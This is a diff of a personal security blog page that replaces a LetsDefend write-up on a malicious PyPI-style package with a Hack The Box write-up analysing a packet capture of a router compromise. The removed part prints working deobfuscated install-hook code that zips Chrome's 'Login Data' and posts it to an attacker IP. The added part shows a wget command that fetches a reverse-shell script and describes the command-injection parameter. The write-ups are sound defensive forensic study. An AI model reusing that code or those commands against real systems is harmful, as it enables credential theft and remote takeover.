@@ -56,11 +56,11 @@
 
 <!-- Open Graph image and Twitter Card metadata -->
 
-<title itemprop="name">Ahmed Mani - Suspicious Python Package LetsDefend Writeup</title>
-<meta property="og:title" content=Ahmed&#32;Mani&#32;-&#32;Suspicious&#32;Python&#32;Package&#32;LetsDefend&#32;Writeup />
-<meta name="twitter:title" content=Ahmed&#32;Mani&#32;-&#32;Suspicious&#32;Python&#32;Package&#32;LetsDefend&#32;Writeup />
-<meta itemprop="name" content=Ahmed&#32;Mani&#32;-&#32;Suspicious&#32;Python&#32;Package&#32;LetsDefend&#32;Writeup />
-<meta name="application-name" content=Ahmed&#32;Mani&#32;-&#32;Suspicious&#32;Python&#32;Package&#32;LetsDefend&#32;Writeup />
+<title itemprop="name">Ahmed Mani - Trent Sherlock a Hack The Box Writeup</title>
+<meta property="og:title" content=Ahmed&#32;Mani&#32;-&#32;Trent&#32;Sherlock&#32;a&#32;Hack&#32;The&#32;Box&#32;Writeup />
+<meta name="twitter:title" content=Ahmed&#32;Mani&#32;-&#32;Trent&#32;Sherlock&#32;a&#32;Hack&#32;The&#32;Box&#32;Writeup />
+<meta itemprop="name" content=Ahmed&#32;Mani&#32;-&#32;Trent&#32;Sherlock&#32;a&#32;Hack&#32;The&#32;Box&#32;Writeup />
+<meta name="application-name" content=Ahmed&#32;Mani&#32;-&#32;Trent&#32;Sherlock&#32;a&#32;Hack&#32;The&#32;Box&#32;Writeup />
 <meta property="og:site_name" content="Ahmed&#39;s blog" />
 
 
@@ -70,14 +70,14 @@
 <meta name="twitter:description" content="" />
 
 
-<base href="http://localhost:1313/posts/suspicious-python-package/" />
-<link rel="canonical" href="http://localhost:1313/posts/suspicious-python-package/" itemprop="url" />
-<meta name="url" content="http://localhost:1313/posts/suspicious-python-package/" />
-<meta name="twitter:url" content="http://localhost:1313/posts/suspicious-python-package/" />
-<meta property="og:url" content="http://localhost:1313/posts/suspicious-python-package/" />
+<base href="http://localhost:1313/posts/trent-sherlock-a-hack-the-box-writeup/" />
+<link rel="canonical" href="http://localhost:1313/posts/trent-sherlock-a-hack-the-box-writeup/" itemprop="url" />
+<meta name="url" content="http://localhost:1313/posts/trent-sherlock-a-hack-the-box-writeup/" />
+<meta name="twitter:url" content="http://localhost:1313/posts/trent-sherlock-a-hack-the-box-writeup/" />
+<meta property="og:url" content="http://localhost:1313/posts/trent-sherlock-a-hack-the-box-writeup/" />
 
 
-<meta property="og:updated_time" content="2026-01-26T00:00:00&#43;01:00" />
+<meta property="og:updated_time" content="2026-02-14T00:00:00&#43;01:00" />
 
 
 <link rel="sitemap" type="application/xml" title="Sitemap" href='http://localhost:1313/sitemap.xml' />
@@ -304,15 +304,15 @@
                 <div class="post">
   <div class="info">
   <h1 class="post-title">
-    <a href="http://localhost:1313/posts/suspicious-python-package/">Suspicious Python Package LetsDefend Writeup</a>
+    <a href="http://localhost:1313/posts/trent-sherlock-a-hack-the-box-writeup/">Trent Sherlock a Hack The Box Writeup</a>
   </h1>
 
   <div class="headline">
     <div>
       
       
-      <time datetime=" 2026-01-26T00:00:00&#43;0100" class="post-date">
-        January 26, 2026
+      <time datetime=" 2026-02-14T00:00:00&#43;0100" class="post-date">
+        February 14, 2026
       </time>
       
       <span> - </span>
@@ -334,102 +334,92 @@
   
 </div>
 
-  <p>This writeup documents my analysis and investigation of the <a href="https://app.letsdefend.io/challenge/suspicious-python-package" target="_blank">Suspicious Python Package</a> challenge on LetsDefend. As you can guess the objective was to investigate a malicious python package. Let’s get into it…</p>
+  <p>This writeup documents my analysis and investigation of the <a href="https://app.hackthebox.com/sherlocks/Trent" target="_blank"><strong>Trent</strong></a> sherlock on Hackthebox. The challenge involves the analysis of a compromised router. Where the attacker gained unauthorized access to the router’s web administration interface, exploited a known vulnerability to achieve remote code execution (RCE), and ultimately established a reverse shell connection to an external command-and-control server.</p>
+<p>We are provided with a trent.pcap file that includes communication between the attacker and the compromised router.</p>
+<p>Let’s get into it…</p>
 <blockquote>
-<p><em>The attacker downloaded a malicious package. What is the full URL?</em></p>
+<p><em>From what IP address did the attacker initially launched their activity?</em></p>
 </blockquote>
-<p>First i assumed the package was downloaded using Chrome instead of Pip. So i looked into the chrome History SQLite db file. Which is located at *“C\Users\Administrator\AppData\Local\Google\Chrome\User Data\Default\History”*This file holds various information regarding downloads made on chrome.</p>
-<p>Press enter or click to view image in full size</p>
-<p><img src="/images/spp-sc1.png" alt="Alt text"></p>
-<p>Inspecting the <em>urls</em> table gives us the first answer <em>“https://github.com/0xMM0X/peloton”</em></p>
+<p>After filtering for HTTP traffic in Wireshark, Assuming the router’s web interface was at “192.168.10.1”, the only internal host interacting with the router was <em><strong>192.168.10.2</strong></em></p>
+<p><img src="/images/htb-trent-sc1.png" alt=""></p>
 <blockquote>
-<p><em>What is the name and version of the downloaded package?</em></p>
+<p><em><strong>What is the model name of the compromised router?</strong></em></p>
 </blockquote>
-<p>Inspecting the malicious pacakge metadata file<code>PKG-INFO</code> gives us the next answer. <em>“peloton-client123:0.8.10”</em></p>
-<p><img src="/images/spp-sc2.png" alt="Alt text"></p>
+<p>By filtering for HTTP traffic between the attacker <code>192.168.10.2</code>and the router<code>192.168.10.1</code> I noticed the following request “GET /login_pic.asp”.</p>
+<p><img src="/images/htb-trent-sc2.png" alt=""></p>
+<p>following the HTTP stream and inspecting the response. We get the answer</p>
+<p><em><strong>TEW-827DRU</strong></em></p>
+<p><img src="/images/htb-trent-sc3.png" alt=""></p>
 <blockquote>
-<p><em>What is the exact time that this package was downloaded?</em></p>
+<p><em>How many failed login attempts did the attacker try before successfully logging into the router?</em></p>
 </blockquote>
-<p>The term ‘was downloaded’ is a bit vague here, but it refers the exact time the package download was started. You can figure this out in two ways either inspect the master file table “$MFT” as the hint says or do what i did.</p>
-<p>Using the chrome History file from first question, I extracted the “start_time” timestamp from the downloads table.</p>
-<p>Press enter or click to view image in full size</p>
-<p><img src="/images/spp-sc3.png" alt="Alt text"></p>
-<p>Chrome represents timestamps in the WebKit format so we have to convert it to Unix format first, Using following formula.</p>
-<pre tabindex="0"><code>WebKit timestamp / 1000000 – 11644473600
-</code></pre><p>We obtain “1705953611” which represents <em>“2024–01–22 20:00:11”</em>.</p>
+<p>Filtering for POST requests using the following filter.</p>
+<p><em><strong>ip.addr==192.168.10.2 &amp;&amp; ip.addr==192.168.10.1 and http.request.method == “POST”</strong></em></p>
+<p><img src="/images/htb-trent-sc4.png" alt=""></p>
+<p>I identified this as the login request based on the POST body. There was a total of 3 similar requests sent. And after the third there was a lot of resources related to the admin panel being fetched, Indicating successful login. The answer here is <em><strong>2.</strong></em></p>
 <blockquote>
-<p><em>What file in the package contains malicious code?</em></p>
+<p><em>At what UTC time did the attacker successfully log into the routers web admin interface?</em></p>
 </blockquote>
-<p>The only file containing executable code within the package is <em>“setup.py”.</em></p>
+<p>The third succsessful login request was sent at <em><strong>2024–05–01 15:53:27.</strong></em></p>
+<p><img src="/images/htb-trent-sc5.png" alt=""></p>
 <blockquote>
-<p><em>What was the name of the archive file created for exfiltration and then deleted?</em></p>
+<p><em>How many characters long was the password used to log in successfully?</em></p>
 </blockquote>
-<p>Alright now the fun part we get to deobfuscate the malicious code.</p>
-<pre tabindex="0"><code>_ = lambda __ : import(&#39;zlib&#39;).decompress(import(&#39;base64&#39;).b64decode(__[::-1]));exec((_)(b&#39;=UJaK/-9Fy+nA//2VVchj3Yu/utRf3wJwqs2+Hk2b3NXjc39vRVPpDjnLwNccUvHWrBWZ7AHdnrAgqHsd4OGbLnHwlCCIwGeJzxdw/w5KXuCpOjA15liyTUzglZfMi9gwICmQIdOvFeeWaVSHTjppmEeMIO5DfasOEVzqtwDpX7cSVJ5X8gL+qnuz397UJ8uf7jIuL5wj1f40VveDklPwVnPJjr1Ou+gBCsMSLLS0thhZm3RprTFbY6kzes0QJS7DHjRnWxLyjr634/QMy9gufPjSe1U4mLQtsA7h9TKiPSchFQTT6wRvbxH5dN8ZSCAPKaDR3CtlKW8CxXMjAIK1lZR1dXc71Xd77ffzgv35Zgf5D5AL/pt+kzvmVcjbmnn8xhyHmoWgi8av1veHp/BZyBi+r9OK6dUEje5IonnwO4osYDYo7t9wCNYu9VHYjStq+rriGq63dhm6bZdrBSp6ZYN552uo6v+YyMc/1Z1XGEtPEMwji/3F7RhwEn7vQKYl6D0SyPhnbI8fFSRVD6fLSwAy1ZJrQ8sn3GQVQKRReT03VrTwLLq1g24ZNzpIVanTfSLWusjr/l/kn0sE2ZnWBCe6reQjdamB/G2uF9ZOzFstXSOiUVXpCLS2T9NVpRxeZPflWtkgPBKscV2aeLiwS1Jocv8IVnB3H6cennD6rzmLbaq2yt0Ie/fsebB5TmEZIwttoGqhuh+u8SHKtTjokPzI03pq5iZo2hwPk/gvUwz2r1FV9xJe&#39;))
-</code></pre><p>The “;” marks the end of a line and the start of a new one (on the same line) so let’s start by seperating them.</p>
-<pre tabindex="0"><code>_ = lambda __ : import(&#39;zlib&#39;).decompress(import(&#39;base64&#39;).b64decode(__[::-1]))
-</code></pre><p>Is the equivalent of</p>
-<pre tabindex="0"><code>import zlib, base64
-function _( __ ):
-  zlib.decompress(base64.b64decode(__[::-1]))
-</code></pre><p>The code simply reverses a base64 line, decodes it, then decompresses it. While the second line calls the same function with the base64 payload string. Deobfuscating the payload in the same manner i obtained the</p>
-<pre tabindex="0"><code>from setuptools import setup #line:1
-from setuptools .command .install import install #line:2
-import requests #line:3
-import base64 #line:4
-import zipfile #line:5
-import os #line:6
-class CustomInstall (install ):#line:8
-  def run (OOOO000OOO0O00OO0 ):#line:9
-    install .run (OOOO000OOO0O00OO0 )#line:10
-    O00O0O000O00OOO0O =&#39;C:\\\\Users\\\\Administrator\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Login Data&#39;#line:12
-    O00OO000OO0OOO00O =&#39;temp_file.zip&#39;#line:14
-    with zipfile .ZipFile (O00OO000OO0OOO00O ,&#39;w&#39;,zipfile .ZIP_DEFLATED )as OO0OOOO0O00OOOOOO :#line:15
-    OO0OOOO0O00OOOOOO .write (O00O0O000O00OOO0O ,os .path .basename (O00O0O000O00OOO0O ))#line:16
-    with open (O00OO000OO0OOO00O ,&#39;rb&#39;)as OO0OOOO0O00OOOOOO :#line:18
-    OO0O00O00OOOO00O0 =base64 .b64encode (OO0OOOO0O00OOOOOO .read ()).decode (&#39;utf-8&#39;)#line:19
-    os .remove (O00OO000OO0OOO00O )#line:21
-    O0OO0OOOO0O0OO00O =&#39;http://172.31.78.151:8000/&#39;+OO0O00O00OOOO00O0 #line:23
-    requests .post (O0OO0OOOO0O0OO00O )#line:24
-setup (name =&#39;peloton-client123&#39;,version =&#39;0.8.10&#39;,description =&#39;test&#39;,author =&#39;red-fire&#39;,license =&#39;MIT&#39;,zip_safe =False ,cmdclass ={&#39;install&#39;:CustomInstall })
-</code></pre><p>The space between the class and method name confused me so much. I didnt know its syntatically correct…..well you learn something new everyday.</p>
-<p>The code compresses the Chrome credential database file, Base64 encodes it and sends it in a POST request to the attacker. The zip file name is <em>“temp_file.zip”.</em></p>
+<p>Looking at the request body “log_pass“ was set to an empty string so the answer here is <em><strong>0.</strong></em></p>
+<p><img src="/images/htb-trent-sc6.png" alt=""></p>
 <blockquote>
-<p><em>When did the zip file get deleted?</em></p>
+<p><em>What is the current firmware version installed on the compromised router?</em></p>
 </blockquote>
-<p>For this question i utilized the $UsnJrnl file, which is an NTFS system file that records changes made to files and directories on a volume. The actual data is contained within another binary file located at “C$Extend$J”.</p>
-<p>To read the data i used <a href="https://github.com/EricZimmerman/MFTECmd" target="_blank">MFTECmd</a> along with the Master File Table “$MFT” to parse it.</p>
-<pre tabindex="0"><code>MFTECmd.exe -f C:\Users\LetsDefend\Desktop\$J -m C:\Users\LetsDefend\Desktop\$MFT - csv . - csvf usnjrnl.csv
-</code></pre><p>Searching in the resulting csv file, I found the deletion date which is <em>“2024–01–22 20:00:42”</em></p>
+<p>This took a lot of time to figure out, After searching manually for the string “firmware“ in the response of various requests. I resorted to using tcpdump and grep to search for any format firmware version would be represented as, as well as the flag format.</p>
+<p><img src="/images/htb-trent-sc7.png" alt=""></p>
+<p>which yeilded the answer <em><strong>2.10.</strong></em></p>
 <blockquote>
-<p><em>What exactly did the attacker steal from the victim’s machine? (Name of the file)</em></p>
+<p><em>Which HTTP parameter was manipulated by the attacker to get remote code execution on the system?</em></p>
 </blockquote>
-<p>From the python code above the sotlen file is “<em>Login Data</em>”.</p>
+<p>Inspecting the HTTP POST requests sent by the malicious user, i noticed this request and the “whoami” here stood out. the answer is <em><strong>usbapps.config.smb_admin_name</strong></em></p>
+<p><img src="/images/htb-trent-sc8.png" alt=""></p>
 <blockquote>
-<p><em>The stolen file contains some sensitive data. What is the full URL of the website and the victim’s username?</em></p>
+<p><em>What is the CVE number associated with the vulnerability that was exploited in this attack?</em></p>
 </blockquote>
-<p>Inpsecting the stolen file in DB Viewer, In the logins table we get the answer “<a href="https://app.letsdefend.io/_all4m" target="_blank">*https://app.letsdefend.io/_all4m</a>”*.</p>
-<p>Press enter or click to view image in full size</p>
-<p><img src="/images/spp-sc4.png" alt="Alt text"></p>
+<p>Searching for CVE’s related to TEW-827DRU with firmware version 2.10 i found <a href="https://nvd.nist.gov/vuln/detail/CVE-2024-28353" target="_blank">CVE-2024-28353</a> .</p>
+<h3 id="t"><strong>“T<em>here is a command injection vulnerability in the TRENDnet TEW-827DRU router with firmware version 2.10B01. An attacker can inject commands into the post request parameters usapps.config.smb_admin_name in the apply.cgi interface, thereby gaining root shell privileges.”</em></strong></h3>
+<p>This explains the earlier request, Eitherway the answer here is <em><strong>CVE-2024–28353.</strong></em></p>
 <blockquote>
-<p><em>What is the IP and PORT number of the attacker C2?</em></p>
+<p><em>What was the first command the attacker executed by exploiting the vulnerability?</em></p>
 </blockquote>
-<p><em>“172.31.78.151:8000”</em></p>
-<h1 id="conclusion">Conclusion</h1>
-<p>To be honest this was an extremley easy challenge, looking forward for harder exercices. Hope to see you in the next writeup, stay safe.</p>
+<p>Remmber the weird packet? <em><strong>whoami</strong></em> happens to be the first command the attacker executes.</p>
+<blockquote>
+<p><em>What command did the actor use to initiate the download of a reverse shell to the router from a host outside the network?</em></p>
+</blockquote>
+<p>Looking at other HTTP requests sent to apply.cgi, I noticed this request where the attacker used <strong>wget</strong> to download a shell script from a server he controls. The answer here is <em><strong>wget <a href="http://35.159.25.253:8000/a1l4m.sh%E2%80%9D" target="_blank">http://35.159.25.253:8000/a1l4m.sh</a></strong></em></p>
+<p><img src="/images/htb-trent-sc9.png" alt=""></p>
+<blockquote>
+<p><em>Multiple attempts to download the reverse shell from an external IP failed. When the actor made a typo in the injection, what response message did the server return?</em></p>
+</blockquote>
+<p>In one injection attempt, the attacker omitted a backtick `, causing command failure.</p>
+<p><img src="/images/htb-trent-sc10.png" alt=""></p>
+<p>Following the TCP stream we can see the router replied with <em><strong>Access to this resource is forbidden</strong></em></p>
+<p><img src="/images/htb-trent-sc11.png" alt=""></p>
+<blockquote>
+<p><em>What was the IP address and port number of the command and control (C2) server when the actor’s reverse shell eventually did connect? (IP:Port)</em></p>
+</blockquote>
+<p>Filtering for retrieval of the shell script using the following filter.</p>
+<pre tabindex="0"><code>http contains &#34;a1l4m.sh&#34; &amp;&amp; http.request.method == &#34;GET&#34;
+</code></pre><p><img src="/images/htb-trent-sc12.png" alt=""></p>
+<p>We find the GET request for the shell script, Following the TCP stream we obtain the script contents. Which attempts a reverse shell connection to <em><strong>35.159.25.253:41143</strong></em></p>
+<p><img src="/images/htb-trent-sc13.png" alt=""></p>
+<h1 id="conclusion"><strong>Conclusion</strong></h1>
+<p>This was a good challenge, it honed my WireShark skills further and was overall fun to play.</p>
+<p><img src="/images/htb-trent-sc14.png" alt=""></p>
 
   
   <hr>
 <div class="footer">
     
 	    
-            <a class="previous-post" href="http://localhost:1313/posts/wordpress-web-forensics/?ref=footer"><span style="font-weight:bold;">« Previous</span><br>Wordpress Web Forensics LetsDefend Writeup</a>
+            <a class="previous-post" href="http://localhost:1313/posts/allegretto-hackthebox-writeup/?ref=footer"><span style="font-weight:bold;">« Previous</span><br>Allegretto a HTB Writeup</a>
         
 	    
-            <div class="next-post">
-                <a href="http://localhost:1313/posts/allegretto-hackthebox-writeup/?ref=footer"><span style="font-weight:bold;">Next »</span><br>Allegretto a HTB Writeup</a>
-            </div>
-        
     
 </div>
 
@@ -441,7 +431,15 @@ setup (name =&#39;peloton-client123&#39;,version =&#39;0.8.10&#39;,description =
     <div class="article-toc ">
     <div class="toc-wrapper">
       <h4 id="contents"></h4>
-      <nav id="TableOfContents"></nav>
+      <nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#t"><strong>“T<em>here is a command injection vulnerability in the TRENDnet TEW-827DRU router with firmware version 2.10B01. An attacker can inject commands into the post request parameters usapps.config.smb_admin_name in the apply.cgi interface, thereby gaining root shell privileges.”</em></strong></a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
     </div>
 </div>
 
